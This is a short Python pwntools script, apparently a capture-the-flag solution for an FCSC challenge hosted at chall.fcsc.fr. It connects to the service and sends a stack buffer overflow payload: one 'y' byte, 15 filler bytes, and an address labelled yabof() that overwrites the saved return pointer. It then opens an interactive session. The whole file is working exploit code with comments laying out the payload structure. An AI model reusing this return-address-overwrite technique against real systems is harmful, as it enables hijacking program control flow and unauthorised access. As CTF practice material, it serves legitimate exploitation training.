from pwn import *

HOST, PORT = "chall.fcsc.fr", 2109
RET2YABOF = 0x401146

def main():
    p = remote(HOST, PORT)
    # Wait for prompt
    p.recvuntil(b"?")

    # Build payload:
    # 1 byte: 'y'
    # 15 bytes: filler to reach saved RIP
    # 8 bytes: address of yabof()
    payload  = b"y"
    payload += b"A" * 15
    payload += p64(RET2YABOF)

    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    main()